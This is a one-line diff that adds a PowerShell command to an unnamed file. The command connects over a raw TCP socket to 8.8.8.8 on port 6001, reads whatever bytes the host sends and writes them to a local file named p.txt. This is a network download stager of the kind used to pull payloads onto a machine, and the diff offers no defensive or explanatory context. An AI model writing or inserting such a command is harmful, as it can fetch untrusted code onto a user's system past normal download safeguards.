@@ -1,0 +1,1 @@
+$c=new-object net.sockets.tcpclient;$c.connect('8.8.8.8',6001);$t=$c.getstream();$m=new-object io.memorystream;$b=new-object byte[] 2048;while(($r=$t.read($b,0,$b.length)) -gt 0){$m.write($b,0,$r)}sc -v $m.toarray() -enc byte p.txt
